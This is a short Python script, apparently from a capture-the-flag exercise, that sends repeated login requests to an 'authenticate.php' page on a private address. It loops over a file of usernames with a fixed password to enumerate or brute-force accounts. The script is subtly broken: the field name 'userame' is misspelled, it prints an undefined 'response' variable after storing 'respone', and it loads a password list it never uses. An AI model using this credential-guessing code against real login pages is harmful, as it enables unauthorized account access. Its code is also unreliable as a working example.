#!/usr/bin/env python3

import requests

url = "http://10.10.196.169/sUp3r-s3cr3t/authenticate.php"

def login(username,password):
	r = requests.post(url, data= {
			"userame":username,
			"password":password,
			"submit": "Login",
		})

	return r 


with open("userid.txt", "r") as h:
	usernames = [ line.strip() for line in h.read().split("\n") ]
with open("credentials.txt", "r") as h:
	passwords = [ line.strip() for line in h.read().split("\n") ]

for username in usernames:
	respone = login(username, "plzsub").text
	print(f"username {username}: {response}")